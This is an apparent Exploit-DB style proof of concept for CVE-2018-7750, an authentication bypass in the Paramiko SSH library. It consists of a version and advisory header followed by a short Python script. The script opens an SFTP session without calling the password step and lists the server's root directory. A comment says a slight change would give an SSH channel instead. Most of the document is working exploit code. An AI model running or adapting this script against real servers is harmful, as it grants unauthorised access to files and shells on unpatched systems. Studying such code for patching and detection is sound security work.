# Exploit Title: Paramiko 2.4.1 - Authentication Bypass
# Date: 2018-10-27
# Exploit Author: Adam Brown
# Vendor Homepage: https://www.paramiko.org
# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2
# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1
# Tested on: Multiple
# CVE : CVE-2018-7750

# This PoC is based on discussions found at the following github issue:
# https://github.com/paramiko/paramiko/issues/1175
# TLDR, Paramiko doesn't check if the client has completed the authentication step
# before allowing the client to open channels. The PoC below connects to an SFTP
# server, and lists the root directory without authenticating. Slight modification
# is required if you want to open an SSH channel.

#!/usr/bin/python
import paramiko

host = '127.0.0.1'
port = 22

trans = paramiko.Transport((host, port))
trans.start_client()

# If the call below is skipped, no username or password is required.
# trans.auth_password('username', 'password')

sftp = paramiko.SFTPClient.from_transport(trans)
print(sftp.listdir('/'))
sftp.close()